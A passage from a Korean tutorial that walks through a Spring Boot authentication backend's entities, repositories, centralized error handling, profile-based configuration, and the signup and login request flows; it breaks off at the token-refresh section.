#### 왜 `User` 와 `Account` 로 나눴나

| `users` 테이블 | `accounts` 테이블 |
|---|---|
| 닉네임, 아파트, 동, 호 | 이메일, 비밀번호, 리프레시 토큰 |
| **이 사람은 누구인가** | **어떻게 로그인하는가** |

나눠 두면 나중에 **카카오 로그인·구글 로그인**을 추가할 때 `accounts` 만 늘리면 됩니다. 한 사람이 여러 로그인 수단을 가질 수 있게 확장하기 쉽습니다.

#### `User.java`

```java
@Entity                                                                   // (1)
@Table(
    name = "users",                                                       // (2)
    uniqueConstraints = @UniqueConstraint(name = "uk_users_nickname", columnNames = "nickname")) // (3)
@Getter                                                                   // (4)
@EntityListeners(AuditingEntityListener.class)                            // (5)
@NoArgsConstructor(access = AccessLevel.PROTECTED)                        // (6)
public class User {
```

1. **`@Entity`** — "이 클래스는 DB 표와 짝이다".
2. **`@Table(name = "users")`** — 표 이름. `user` 는 여러 DB 에서 **예약어**라 쓰면 오류가 나므로 복수형을 씁니다.
3. **유니크 제약에 이름을 붙였습니다.**
   > **왜 이름을 붙이나**: 중복이 나면 DB 오류 메시지에 이 이름이 들어옵니다. [`GlobalExceptionHandler`](#3-18-예외-처리--오류를-한-모양으로) 가 그 **이름을 읽어서** "이메일이 겹쳤나, 닉네임이 겹쳤나"를 구분합니다. 이름을 안 붙이면 `UK8s2j...` 같은 자동 생성 이름이라 구분할 수 없습니다.
4. **`@Getter` 만 있고 `@Setter` 가 없습니다.** 의도적입니다.
   > `@Setter` 를 붙이면 아무나 아무 값이나 바꿀 수 있습니다. `user.setStatus(ACTIVE)` 로 탈퇴를 되돌릴 수도 있게 됩니다.
   > 대신 **의미 있는 메서드**(`withdraw`, `changeNickname`)만 열어 둡니다. 그러면 **"어떤 변경이 가능한지"가 코드에 드러납니다.**
5. **`@EntityListeners(AuditingEntityListener.class)`** — 아래 `@CreatedDate` / `@LastModifiedDate` 를 자동으로 채워 주는 장치를 붙입니다. `ApiApplication` 의 `@EnableJpaAuditing` 과 **한 쌍**입니다.
6. **`@NoArgsConstructor(access = PROTECTED)`** — JPA 규격상 **기본 생성자가 반드시 있어야** 합니다(DB 에서 읽어올 때 씁니다). 그런데 `public` 으로 열어 두면 **아무 값도 없는 빈 `User`** 를 아무나 만들 수 있습니다. 그래서 `protected` 로 최소한만 열어 둡니다.

```java
  public static final int WITHDRAWAL_REASON_LENGTH = 255;                 // (1)

  @Id                                                                     // (2)
  @GeneratedValue(strategy = GenerationType.IDENTITY)                     // (3)
  private Long id;

  @Column(nullable = false, length = 20)                                  // (4)
  private String nickname;

  @Column(nullable = false, length = 100)
  private String aptName;

  @Column(nullable = true, length = 20)                                   // (5)
  private String dong;

  @Column(nullable = true, length = 20)
  private String ho;
```

1. **상수로 뽑아 둔 이유**: `WithdrawalRequest` 의 `@Size(max = 255)` 와 **같은 값을 두 곳에 적어야** 하는데, 상수로 두면 한쪽만 고치는 실수를 줄일 수 있습니다.
2. **`@Id`** — 기본키.
3. **`IDENTITY`** — **DB 가 번호를 자동으로 매기게** 합니다(MySQL 의 AUTO_INCREMENT). 우리가 정하지 않습니다.
4. **`nullable = false`** — 반드시 값이 있어야 함. **DB 차원의 마지막 방어선**입니다. 자바 검증을 어쩌다 우회해도 여기서 막힙니다.
5. **동·호는 `nullable = true`** — 선택 입력입니다.

```java
  @Enumerated(EnumType.STRING)                                            // (1)
  @Column(nullable = false, length = 20)
  private Role role = Role.USER;                                          // (2)

  @Enumerated(EnumType.STRING)
  @Column(nullable = false, length = 20)
  private Status status = Status.ACTIVE;
```

1. **`EnumType.STRING` 이 매우 중요합니다.**

   | 방식 | 저장되는 값 | 문제 |
   |---|---|---|
   | `ORDINAL`(기본값) | `0`, `1` | **enum 순서를 바꾸면 기존 데이터의 의미가 통째로 바뀝니다** |
   | `STRING` | `"USER"`, `"ADMIN"` | 안전. 사람이 DB 를 봐도 읽힘 |

   > `ORDINAL` 로 저장해 두고 나중에 `enum Role { GUEST, USER, ADMIN }` 처럼 앞에 하나를 끼워 넣으면, 기존 `USER`(0) 가 전부 `GUEST` 가 됩니다. **반드시 `STRING` 을 쓰세요.**
2. **필드에 직접 기본값을 줍니다.** 빌더에서 `role` 을 안 받으므로, 가입하면 무조건 `USER` 로 시작합니다. **요청으로 `ADMIN` 을 지정할 방법이 아예 없습니다.**

```java
  @Column private LocalDateTime withdrawnAt;

  @Column(length = WITHDRAWAL_REASON_LENGTH)
  private String withdrawalReason;                                        // (1)

  @CreatedDate                                                            // (2)
  @Column(nullable = false, updatable = false)                            // (3)
  private LocalDateTime createdAt;

  @LastModifiedDate                                                       // (4)
  @Column(nullable = false)
  private LocalDateTime updatedAt;
```

1. **탈퇴 사유** — 개인정보 수집·이용 동의에서 **선택 항목**으로 받기로 한 값입니다. 서비스 품질 개선과 이용 현황 분석에만 쓰고, **탈퇴 후 30일이 지나면 파기해야** 합니다.
   > 🔎 이 파기 작업은 **아직 구현돼 있지 않습니다.** 주석으로만 적혀 있어서, 나중에 주기적으로 도는 작업을 만들어야 합니다.
2. **`@CreatedDate`** — 처음 저장될 때 자동으로 지금 시각이 들어갑니다.
3. **`updatable = false`** — 만든 시각은 **수정 못 하게** 막습니다. 누가 실수로 바꿔도 `UPDATE` 문에 아예 포함되지 않습니다.
4. **`@LastModifiedDate`** — 값이 바뀔 때마다 자동으로 갱신됩니다.

```java
  @Builder
  public User(String nickname, String aptName, String dong, String ho) {  // (1)
    this.nickname = nickname;
    this.aptName = aptName;
    this.dong = dong;
    this.ho = ho;
  }
```

1. **빌더가 받는 값이 딱 4개입니다.** `id`, `role`, `status`, `createdAt` 등은 **받지 않습니다.**
   > 그래서 **밖에서 정할 수 없습니다.** `id` 는 DB 가, `role`/`status` 는 기본값이, 시각은 auditing 이 정합니다. **"바꿀 수 있는 것"과 "바꿀 수 없는 것"이 생성자 모양만 봐도 드러납니다.**

```java
  public boolean isWithdrawn() {
    return this.status == Status.WITHDRAWN;                               // (1)
  }

  public void withdraw(String withdrawalReason) {                         // (2)
    this.status = Status.WITHDRAWN;
    this.withdrawnAt = LocalDateTime.now();
    this.withdrawalReason = withdrawalReason;
  }
```

1. **부르는 쪽이 `user.getStatus() == Status.WITHDRAWN` 을 적을 필요가 없습니다.** 판단 로직이 엔티티 안에 있습니다.
2. **세 가지 변경이 한 메서드에 묶여 있습니다.** 밖에서 setter 로 하나씩 바꾸면 **하나를 빼먹을 수 있는데**, 이렇게 묶어 두면 그럴 수 없습니다.

#### `Account.java`

```java
@Entity
@Table(
    name = "accounts",
    uniqueConstraints = {
      @UniqueConstraint(name = "uk_accounts_email", columnNames = "email"),
      @UniqueConstraint(name = "uk_accounts_refresh_token_hash", columnNames = "refresh_token_hash") // (1)
    })
```

1. **리프레시 토큰 해시에도 유니크 제약**을 걸었습니다. 같은 토큰이 두 계정에 동시에 저장되는 일을 DB 차원에서 막습니다.

```java
  @OneToOne(fetch = FetchType.LAZY)                                       // (1)
  @JoinColumn(name = "user_id", nullable = false)                         // (2)
  private User user;
```

1. **`@OneToOne`** — 계정 하나에 회원 하나.
   **`FetchType.LAZY`(지연 로딩)** — `Account` 를 조회할 때 `User` 를 **같이 가져오지 않고**, `account.getUser()` 를 실제로 부를 때 가져옵니다.
   > 반대인 `EAGER` 는 항상 같이 가져옵니다. 관계가 늘어나면 한 번의 조회가 줄줄이 딸린 조회를 부르게 되므로, **기본은 LAZY** 로 두는 게 좋습니다.
2. **`@JoinColumn`** — 이 관계를 담을 컬럼 이름. `accounts.user_id` 가 `users.id` 를 가리킵니다(외래키).

```java
  @Column(nullable = false, length = 100)
  private String email;

  @Column(nullable = true, length = 83)                                   // (1)
  private String password;
```

1. **83** 은 [`NanumiPasswordEncoder`](#3-9-nanumipasswordencoderjava--비밀번호-해싱) 가 만드는 해시 길이와 정확히 맞춘 값입니다.
   > 🔎 `nullable = true` 인 이유는 나중에 **소셜 로그인**(비밀번호 없는 계정)을 염두에 둔 것으로 보입니다. 지금은 비밀번호 없는 계정을 만드는 경로가 없으므로, 소셜 로그인을 붙이기 전까지는 `false` 로 조여 두는 편이 안전합니다.

```java
  public static final int REFRESH_TOKEN_HASH_LENGTH = 64;                 // (1)

  @Column(name = "refresh_token_hash", length = REFRESH_TOKEN_HASH_LENGTH)
  private String refreshTokenHash;

  @Column private LocalDateTime expiryDate;
```

1. **SHA-256 을 16진수로 적으면 정확히 64자**입니다.
   > 길이를 64 로 고정한 덕분에 **MySQL utf8mb4 인덱스 상한(3072바이트)** 에 걸리지 않습니다. 토큰 원문(1000자 이상)에 유니크 인덱스를 걸려고 했다면 저장 자체가 안 됐을 것입니다.

```java
  public boolean isExpired() {
    return this.expiryDate == null || LocalDateTime.now().isAfter(this.expiryDate); // (1)
  }

  public boolean hasRefreshToken() {
    return this.refreshTokenHash != null;
  }

  public void updateRefreshToken(String refreshTokenHash, LocalDateTime expiryDate) { // (2)
    this.refreshTokenHash = refreshTokenHash;
    this.expiryDate = expiryDate;
  }

  public void clearRefreshToken() {                                       // (3)
    this.refreshTokenHash = null;
    this.expiryDate = null;
  }
```

1. **기한이 없어도(=null) 만료로 봅니다.** 애매하면 안전한 쪽으로 판단하는 것입니다.
2. **해시와 기한을 항상 함께** 바꿉니다.
3. **둘 다 함께** 지웁니다. 하나만 남으면 앞뒤가 안 맞는 상태가 됩니다.

---

### 3-17. 리포지토리 — DB 에 묻는 창구

```java
public interface UserRepository extends JpaRepository<User, Long> {       // (1)

  Optional<User> findByNickname(String nickname);                         // (2)

  boolean existsByNicknameIgnoreCase(String nickname);                    // (3)

  List<User> findByAptName(String aptName);
}
```

1. **인터페이스인데 구현 클래스가 없습니다.** 놀라운 부분입니다.
   > **스프링 데이터 JPA 가 실행 중에 구현체를 자동으로 만들어 줍니다.** `JpaRepository<엔티티, 기본키타입>` 을 물려받기만 하면 `save`, `findById`, `findAll`, `delete`, `count` 등이 **이미 다 들어 있습니다.**
2. **메서드 이름이 곧 질의문입니다.** 이름을 규칙대로 지으면 SQL 이 자동으로 만들어집니다.

   | 메서드 이름 | 만들어지는 SQL |
   |---|---|
   | `findByNickname` | `SELECT * FROM users WHERE nickname = ?` |
   | `existsByEmail` | `SELECT COUNT(*) > 0 FROM accounts WHERE email = ?` |
   | `findByUser_Id` | `SELECT * FROM accounts WHERE user_id = ?` |

   접두사도 뜻이 있습니다: `find`(찾기) / `exists`(있나) / `count`(개수) / `delete`(지우기)
3. **`IgnoreCase`** 를 붙이면 대소문자를 무시합니다. SQL 의 `LOWER()` 로 번역됩니다.

**`findByUser_Id` 의 밑줄** — `Account` 의 `user` 필드를 타고 들어가 그 `id` 로 찾으라는 뜻입니다. 밑줄이 "**여기서 한 단계 들어간다**"는 표시입니다.

```java
// 비밀번호 해시로 계정을 찾는 메서드는 두지 않음
public interface AccountRepository extends JpaRepository<Account, Long> {
  Optional<Account> findByEmail(String email);
  Optional<Account> findByUser_Id(Long userId);
  boolean existsByEmail(String email);
}
```

> **주석이 중요합니다.** `findByPassword` 같은 메서드를 만들면, **해시가 같은 계정들을 되짚을 수 있어서** 같은 비밀번호를 쓰는 사람들을 한꺼번에 찾아낼 수 있습니다. 만들 수 있다고 만들면 안 되는 것의 예입니다.
>
> `UserRepository` 의 주석도 같은 맥락입니다 — 동·호로만 찾는 메서드는 **단지 구분 없이 전국에서 찾게 되어** 쓸 수 없으므로 지웠습니다.

---

### 3-18. 예외 처리 — 오류를 한 모양으로

#### 전체 그림

```
서비스에서  throw new CustomException(ErrorCode.DUPLICATE_EMAIL)
                        │
                        ▼
              GlobalExceptionHandler 가 받음
                        │
                        ▼
              { "status": 409, "message": "이미 사용 중인 이메일입니다." }
```

**어디서 무슨 오류가 나든 프런트는 항상 같은 모양을 받습니다.**

#### `ErrorCode.java` — 오류 목록

```java
@Getter
public enum ErrorCode {
  INVALID_REQUEST(HttpStatus.BAD_REQUEST, "요청 형식이 올바르지 않습니다."),      // 400

  DUPLICATE_EMAIL(HttpStatus.CONFLICT, "이미 사용 중인 이메일입니다."),          // 409
  DUPLICATE_NICKNAME(HttpStatus.CONFLICT, "이미 사용 중인 닉네임입니다."),
  DUPLICATE_RESOURCE(HttpStatus.CONFLICT, "이미 등록된 정보입니다."),            // (1)

  INVALID_CREDENTIALS(HttpStatus.UNAUTHORIZED, "이메일 또는 비밀번호가 올바르지 않습니다."), // (2)
  INVALID_TOKEN(HttpStatus.UNAUTHORIZED, "유효하지 않은 토큰입니다."),
  EXPIRED_REFRESH_TOKEN(HttpStatus.UNAUTHORIZED, "만료된 리프레시 토큰입니다."),
  ACCESS_DENIED(HttpStatus.FORBIDDEN, "접근 권한이 없습니다."),                  // 403

  LOGIN_ATTEMPT_EXCEEDED(HttpStatus.TOO_MANY_REQUESTS, "로그인 시도 횟수를 초과했습니다. 잠시 후 다시 시도해 주세요."), // (3)

  USER_NOT_FOUND(HttpStatus.NOT_FOUND, "사용자를 찾을 수 없습니다."),
  WITHDRAWN_USER(HttpStatus.FORBIDDEN, "이미 탈퇴한 계정입니다."),

  RESOURCE_NOT_FOUND(HttpStatus.NOT_FOUND, "요청한 경로를 찾을 수 없습니다."),     // (4)
  METHOD_NOT_ALLOWED(HttpStatus.METHOD_NOT_ALLOWED, "지원하지 않는 요청 방식입니다."),
  UNSUPPORTED_MEDIA_TYPE(HttpStatus.UNSUPPORTED_MEDIA_TYPE, "지원하지 않는 형식입니다."),

  INTERNAL_ERROR(HttpStatus.INTERNAL_SERVER_ERROR, "요청을 처리하지 못했습니다."); // (5)

  private final HttpStatus status;
  private final String message;

  ErrorCode(HttpStatus status, String message) { ... }
}
```

**오류를 한 곳에 모아 두는 이유**: 메시지를 고칠 때 한 파일만 보면 되고, 같은 상황에 다른 문구가 나가는 일이 없습니다.

1. **어느 값이 겹쳤는지 알아내지 못했을 때 쓰는 기본값.**
2. **"이메일 또는 비밀번호"** — 어느 쪽이 틀렸는지 알려 주지 않습니다. ([3-15](#3-15-authservicejava--실제로-판단하는-곳) 참고)
3. **남은 시간을 알려 주지 않습니다.** "3분 뒤에 풀립니다"라고 하면 공격자가 **정확히 그때 다시 시작**할 수 있습니다.
4. **아래 셋은 스프링이 먼저 걸러 내는 상황**입니다. 우리가 던지지는 않지만, **응답 모양을 나머지와 맞추려고** 코드로 들고 있습니다.
5. **미처 잡지 못한 예외.** 원인은 **로그에만** 남기고 회원에게는 알리지 않습니다.
   > 예외 메시지에는 테이블 이름, 파일 경로, 쿼리 내용 같은 **내부 정보**가 들어 있습니다. 그대로 내보내면 공격자에게 지도를 그려 주는 셈입니다.

#### `CustomException.java`

```java
@Getter
public class CustomException extends RuntimeException {                   // (1)

  private final ErrorCode errorCode;

  public CustomException(ErrorCode errorCode) {
    super(errorCode.getMessage());                                        // (2)
    this.errorCode = errorCode;
  }
}
```

1. **`RuntimeException` 을 물려받습니다.**
   > 자바 예외는 두 종류입니다.
   > - **Checked** (`Exception`) : 메서드마다 `throws` 를 적고, 부르는 쪽이 반드시 처리해야 함
   > - **Unchecked** (`RuntimeException`) : 그럴 필요 없이 **위로 그냥 튕겨 올라감**
   >
   > 우리는 예외를 **맨 위 `GlobalExceptionHandler` 한 곳에서** 받을 것이므로, 중간 코드가 신경 쓰지 않아도 되는 Unchecked 가 맞습니다.
2. **`super(...)`** — 부모에게 메시지를 전달합니다. 그래야 로그에 찍힐 때 메시지가 보입니다.

#### `GlobalExceptionHandler.java`

```java
@Slf4j
@RestControllerAdvice                                                     // (1)
public class GlobalExceptionHandler extends ResponseEntityExceptionHandler { // (2)
```

1. **`@RestControllerAdvice`** — "모든 컨트롤러에서 나는 예외를 여기서 받겠다"는 표시.
2. **`extends ResponseEntityExceptionHandler` 가 중요합니다.**

   > **없으면 무슨 일이 생기나**: 스프링이 던지는 표준 예외(405, 404, 415 등)가 아래 `@ExceptionHandler(Exception.class)` 에 걸려서 **전부 500 으로 나갑니다.**
   > `GET /api/auth/login` 을 한 번 불러 보면 바로 재현됩니다 — 405 여야 할 응답이 500 이 됩니다.
   > 이 부모 클래스는 그런 표준 예외들을 **미리 알맞은 상태 코드로** 처리해 줍니다.

```java
  @ExceptionHandler(CustomException.class)                                // (1)
  public ResponseEntity<ErrorResponse> handleCustomException(CustomException e) {
    ErrorCode errorCode = e.getErrorCode();
    return ResponseEntity.status(errorCode.getStatus()).body(ErrorResponse.of(errorCode));
  }
```

1. **`@ExceptionHandler(X.class)`** — "X 예외가 올라오면 이 메서드를 실행하라".

```java
  @ExceptionHandler(DataIntegrityViolationException.class)                // (1)
  public ResponseEntity<ErrorResponse> handleDataIntegrityViolation(
      DataIntegrityViolationException e) {
    ErrorCode errorCode = resolveConstraint(e);
    log.debug("무결성 제약에 걸림: {}", errorCode, e);                        // (2)
    return ResponseEntity.status(errorCode.getStatus()).body(ErrorResponse.of(errorCode));
  }
```

1. **DB 제약 위반**을 받습니다.
   > [`signup`](#3-15-authservicejava--실제로-판단하는-곳) 의 중복 검사와 저장 사이에 다른 요청이 끼어들면, **검사를 둘 다 통과한 뒤 DB 제약에서 걸립니다.** 이걸 놓치면 "이미 사용 중인 이메일"이어야 할 응답이 **500** 으로 나갑니다.
2. **`{}`** 는 자리표시자입니다. 뒤의 값이 들어갑니다. 마지막 `e` 는 예외 전체라 **스택 추적이 로그에 남습니다.**

```java
  @ExceptionHandler(Exception.class)                                      // (1)
  public ResponseEntity<ErrorResponse> handleUnexpectedException(Exception e) {
    log.error("처리하지 못한 예외가 발생함", e);                              // (2)
    return ResponseEntity.status(ErrorCode.INTERNAL_ERROR.getStatus())
        .body(ErrorResponse.of(ErrorCode.INTERNAL_ERROR));                // (3)
  }
```

1. **최후의 그물.** 위에서 안 잡힌 모든 예외가 여기로 옵니다.
   > 스프링은 **가장 구체적인 핸들러를 먼저** 고르므로, `CustomException` 이 여기로 오지는 않습니다.
2. **원인은 로그에 남깁니다.** 개발자는 봐야 하니까요.
3. **회원에게는 정해 둔 문구만** 돌려줍니다.

```java
  @Override
  protected ResponseEntity<Object> handleMethodArgumentNotValid(          // (1)
      MethodArgumentNotValidException e, HttpHeaders headers,
      HttpStatusCode status, WebRequest request) {
    String message =
        e.getBindingResult().getFieldErrors().stream()                    // (2)
            .map(FieldError::getDefaultMessage)                           // (3)
            .collect(Collectors.joining(", "));                           // (4)

    Object body = ErrorResponse.of(HttpStatus.BAD_REQUEST.value(), message);
    return handleExceptionInternal(e, body, headers, HttpStatus.BAD_REQUEST, request);
  }
```

1. **`@Valid` 검증 실패**를 받습니다. 부모 클래스의 메서드를 덮어썼습니다.
   > 여기만 **"어느 칸이 왜 틀렸는지"를 알려 줍니다.** 사용자가 고칠 수 있어야 하는 정보이기 때문입니다.
2. **스트림(stream)** — 목록을 다룰 때 쓰는 문법입니다. 틀린 필드들을 하나씩 흘려보냅니다.
3. **`.map(...)`** — 각각을 **메시지 문자열로 바꿉니다.**
4. **`.collect(joining(", "))`** — 쉼표로 이어 붙입니다.
   ```
   "이메일을 입력해 주세요., 비밀번호는 8~20자여야 합니다."
   ```

```java
  @Override
  protected ResponseEntity<Object> handleExceptionInternal(               // (1)
      Exception e, Object body, HttpHeaders headers,
      HttpStatusCode statusCode, WebRequest request) {
    if (statusCode.is5xxServerError()) {
      log.error("스프링이 처리한 5xx 예외임", e);                            // (2)
    } else {
      log.debug("스프링이 처리한 4xx 예외임: {}", e.getMessage());
    }

    Object errorBody =
        (body instanceof ErrorResponse) ? body                            // (3)
            : ErrorResponse.of(statusCode.value(), messageOf(statusCode));
    return super.handleExceptionInternal(e, errorBody, headers, statusCode, request);
  }
```

1. **부모 클래스가 처리하는 모든 예외가 마지막에 이 메서드를 거칩니다.** 여기서 응답 모양을 통일합니다.
2. **5xx 는 `error`, 4xx 는 `debug`** 로 기록 수준을 나눕니다.
   > 4xx 는 **사용자가 잘못 보낸 것**이라 매번 `error` 로 남기면 로그가 쓸모없는 내용으로 가득 찹니다. 5xx 는 **우리 잘못**이므로 크게 남깁니다.
3. **`instanceof`** — "이 객체가 그 타입인가". 우리가 직접 넣은 `ErrorResponse` 면 그대로 쓰고, **아니면 우리 형식으로 바꿉니다.**
   > 스프링이 만든 `ProblemDetail` 이 `body` 로 넘어오는 경로가 있습니다(깨진 JSON 등). 그대로 두면 응답 모양이 갈려서 **프런트가 `message` 를 못 꺼냅니다.**

```java
  private ErrorCode resolveConstraint(DataIntegrityViolationException e) {
    Throwable cause = e.getMostSpecificCause();                           // (1)
    String detail = cause.getMessage() == null ? "" : cause.getMessage().toLowerCase(Locale.ROOT);

    if (detail.contains("uk_accounts_email")) {                           // (2)
      return ErrorCode.DUPLICATE_EMAIL;
    }
    if (detail.contains("uk_users_nickname")) {
      return ErrorCode.DUPLICATE_NICKNAME;
    }
    return ErrorCode.DUPLICATE_RESOURCE;                                  // (3)
  }
```

1. **`getMostSpecificCause`** — 예외는 껍질이 여러 겹입니다. 가장 안쪽의 진짜 원인(DB 드라이버 예외)을 꺼냅니다.
2. **제약 이름을 찾습니다.** [엔티티에서 제약에 직접 이름을 붙여 둔](#3-16-엔티티--db-표를-자바-클래스로) 이유가 이것입니다.
3. **못 알아보면 일반 메시지.** 어느 값이 겹쳤는지 몰라도 최소한 409 는 나갑니다.

---

### 3-19. `application.yml` — 설정 파일

#### 파일이 세 개인 이유

```
application.yml        ← 공통 설정 + 어느 프로필을 쓸지
application-dev.yml    ← 개발용 (H2 메모리 DB)
application-prod.yml   ← 운영용 (MySQL)
```

`spring.profiles.active` 에 적힌 것만 **추가로** 읽힙니다. 같은 항목이 있으면 프로필 파일이 이깁니다.

#### `application.yml` (공통)

```yaml
spring:
  application:
    name: api
  profiles:
    active: dev                       # (1)

jwt:
  access-token-expiration: 900000     # 15분   (2)
  refresh-token-expiration: 1209600000 # 14일

nanumi:
  security:
    password:
      iterations: 210000
      pepper: ${PASSWORD_PEPPER:nanumi-local-dev-pepper}    # (3)
    cors:
      allowed-origins: ${CORS_ALLOWED_ORIGINS:http://localhost:5173}

server:
  error:
    include-message: never            # (4)
    include-stacktrace: never
    include-binding-errors: never
    include-exception: false

  forward-headers-strategy: ${FORWARD_HEADERS_STRATEGY:none}   # (5)
```

1. **기본은 개발 프로필.** 운영에서는 `SPRING_PROFILES_ACTIVE=prod` 로 덮어씁니다.
2. **액세스 토큰이 15분인 이유**: 로그아웃·탈퇴를 해도 **이미 나간 액세스 토큰은 만료될 때까지 살아 있습니다.** 토큰마다 DB 를 뒤지지 않는 대신 수명을 짧게 잡아 그 틈을 줄입니다.
3. **`${환경변수:기본값}`** 문법 — 환경 변수가 있으면 그걸, 없으면 뒤의 기본값을 씁니다.
4. **오류 응답에 내부 정보가 섞여 나가지 않게 전부 막습니다.** 예외 이름, 스택 추적이 밖으로 나가면 공격자에게 힌트가 됩니다.
5. **`X-Forwarded-For` 를 믿을지.** 기본은 `none`(안 믿음). ([3-12](#3-12-authcontrollerjava--요청을-받는-입구) 참고)

#### `application-dev.yml` (개발)

```yaml
spring:
  datasource:
    url: jdbc:h2:mem:nanumi;MODE=MySQL     # (1)
    driver-class-name: org.h2.Driver
    username: sa
    password:
  jpa:
    hibernate:
      ddl-auto: update                     # (2)
    show-sql: true                         # (3)
    properties:
      hibernate:
        format_sql: true
  h2:
    console:
      enabled: true                        # (4)
      path: /h2-console

jwt:
  private-key-path: classpath:keys/private_key.pem   # (5)
  public-key-path: classpath:keys/public_key.pem

logging:
  level:
    com.nanumi: debug                      # (6)
```

1. **`h2:mem`** — **메모리에만 존재하는 DB.** 서버를 끄면 데이터가 다 사라집니다. 설치가 필요 없어 개발에 편합니다.
   **`MODE=MySQL`** — H2 에게 "MySQL 처럼 행동해라"고 지시합니다. 운영(MySQL)과 동작 차이를 줄이기 위해서입니다.
2. **`ddl-auto: update`** — 엔티티를 보고 **표를 자동으로 만들고 고칩니다.** 개발에 편리합니다.
   > ⚠️ **운영에서는 절대 쓰면 안 됩니다.** 엔티티를 잘못 고치면 **운영 DB 구조가 자동으로 바뀝니다.**
3. **`show-sql`** — 실행되는 SQL 을 콘솔에 출력. `format_sql` 은 보기 좋게 줄바꿈.
4. **H2 콘솔** — 브라우저에서 DB 를 직접 들여다볼 수 있는 화면. `http://localhost:8080/h2-console`.
   [`SecurityConfig` 의 별도 필터 체인](#3-5-securityconfigjava--보안-규칙-조립)이 이 주소를 담당합니다.
5. **`classpath:`** — 프로젝트 안 `resources/keys/` 에서 찾습니다.
   > ⚠️ 여기 키는 **개발용 예시 키**입니다. 운영 키는 절대 저장소에 올리면 안 됩니다.
6. **우리 패키지만 `debug` 수준**으로 자세히 기록합니다.

#### `application-prod.yml` (운영)

```yaml
spring:
  datasource:
    url: ${DB_URL}                         # (1)
    driver-class-name: com.mysql.cj.jdbc.Driver
    username: ${DB_USERNAME}
    password: ${DB_PASSWORD}
  jpa:
    hibernate:
      ddl-auto: validate                   # (2)
    show-sql: false                        # (3)
  h2:
    console:
      enabled: false                       # (4)

jwt:
  private-key-path: ${JWT_PRIVATE_KEY_PATH}
  public-key-path: ${JWT_PUBLIC_KEY_PATH}

nanumi:
  security:
    password:
      iterations: ${PASSWORD_ITERATIONS:210000}
      pepper: ${PASSWORD_PEPPER}           # (5)
    cors:
      allowed-origins: ${CORS_ALLOWED_ORIGINS}
```

1. **기본값이 없습니다.** 환경 변수를 안 넣으면 **서버가 아예 안 뜹니다.**
   > 이게 의도입니다. 비밀번호를 파일에 적어 두면 저장소에 올라갈 위험이 있고, 실수로 개발 설정으로 운영이 도는 것보다 **안 뜨는 게 낫습니다.**
2. **`validate`** — 표를 **만들지도 고치지도 않고**, 엔티티와 실제 구조가 맞는지 **확인만** 합니다. 안 맞으면 서버가 안 뜹니다.
   > 🔎 다만 그러면 **DB 구조를 누가 만드나**는 문제가 남습니다. 지금은 사람이 SQL 을 직접 실행해야 합니다. Flyway 같은 도구를 붙이면 자동화됩니다.
3. **SQL 출력을 끕니다.** 성능도 성능이지만, **로그에 실제 데이터가 찍히는 것**을 막습니다.
4. **H2 콘솔을 끕니다.**
5. **pepper 에 기본값을 두지 않았습니다.** 값이 없으면 안 뜨게 해서, **개발용 pepper 로 운영이 도는 사고**를 원천 차단합니다.

#### 운영에 필요한 환경 변수

| 이름 | 예시 | 없으면 |
|---|---|---|
| `SPRING_PROFILES_ACTIVE` | `prod` | 개발 프로필로 뜸 (H2, 예시 키) |
| `DB_URL` / `DB_USERNAME` / `DB_PASSWORD` | — | 서버 안 뜸 |
| `JWT_PRIVATE_KEY_PATH` / `JWT_PUBLIC_KEY_PATH` | `file:/etc/nanumi/private_key.pem` | 서버 안 뜸 |
| `PASSWORD_PEPPER` | 긴 무작위 문자열 | 서버 안 뜸 |
| `CORS_ALLOWED_ORIGINS` | `https://nanumi.app` | 서버 안 뜸 |
| `PASSWORD_ITERATIONS` | `210000` | 기본 21만 |
| `FORWARD_HEADERS_STRATEGY` | `framework` | `none` |

> ⚠️ **`PASSWORD_PEPPER` 는 DB 백업과 별도로 보관해야 합니다.** 잃어버리면 전 회원이 로그인 불가가 되고, 되살릴 방법이 없습니다.

---
## 4. 기능별로 따라가 보기

3장에서 파일을 하나씩 봤으니, 이제 **실제 요청 하나가 여러 파일을 어떻게 오가는지** 봅니다.

### 4-1. 회원가입

```
POST /api/auth/signup
{ "email": "Test@A.com ", "password": "nanumi1234!",
  "nickname": "철수", "aptName": "행복아파트", "dong": "101", "ho": "" }
```

| # | 어디서 | 무슨 일 |
|---|---|---|
| 1 | `SecurityConfig` | `permitAll` 목록에 있음 → 토큰 없이 통과 |
| 2 | `SanitizingStringDeserializer` | `"Test@A.com "` → `"Test@A.com"` (공백 제거)<br>비밀번호는 **공백을 안 뗌** |
| 3 | `@Valid` + 검증기 4종 | 이메일 형식, 비밀번호 규칙, 닉네임 2~10자, `@SafeText` |
| 4 | `AuthController.signup` | `AuthService` 에 넘김 |
| 5 | `AuthService` | `normalizeEmail` → `"test@a.com"` (소문자) |
| 6 | `AccountRepository` | `existsByEmail` → 있으면 **409 종료** |
| 7 | `UserRepository` | `existsByNicknameIgnoreCase` → 있으면 **409 종료** |
| 8 | `AuthService` | `blankToNull("")` → `ho = null` |
| 9 | `UserRepository.save` | `users` 에 저장 → `id` 발급, `createdAt` 자동 |
| 10 | `NanumiPasswordEncoder.encode` | **PBKDF2 21만 번** (여기서 0.1초쯤) |
| 11 | `AccountRepository.save` | `accounts` 에 저장 |
| 12 | 트랜잭션 커밋 | **여기서 실제로 DB 에 확정됨** |
| 13 | 응답 | `201 Created` + `SignupResponse` |

**토큰을 안 주는 것에 주목하세요.** 가입 후 로그인 화면으로 보내는 정책입니다.

### 4-2. 로그인

```
POST /api/auth/login   { "email": "test@a.com", "password": "nanumi1234!" }
```

| # | 어디서 | 무슨 일 |
|---|---|---|
| 1 | `AuthController` | `getRemoteAddr()` 로 IP 확보 |
| 2 | `LoginAttemptService.checkBlocked` | 이메일 5회 / IP 20회 초과면 **429 종료** |
| 3 | `AccountRepository.findByEmail` | 계정 조회 |
| 4a | **계정이 없으면** | 더미 해시로 해싱 → 실패 기록 → **401 종료** |
| 4b | **비밀번호가 틀리면** | 실패 기록 → **401 종료** (4a 와 **같은 메시지**) |
| 5 | `LoginAttemptService.recordSuccess` | 이메일 실패 기록만 삭제 |
| 6 | `User.isWithdrawn` | 탈퇴 회원이면 **403 종료** |
| 7 | `upgradeEncoding` | 필요하면 더 강한 해시로 재저장 (`save()` 없이) |
| 8 | `JwtTokenProvider` | 액세스 토큰(15분) 발급 |
| 9 | `issueRefreshToken` | 리프레시 토큰(14일) 발급 → **해시만** DB 에 저장 |
| 10 | 응답 | `200` + 토큰 2개 + 회원 정보 |

### 4-3. 토큰 재발급

```
POST /api/auth/refresh   { "refreshToken": "eyJ..." }
```

| # | 무슨 일 |
|---|---|
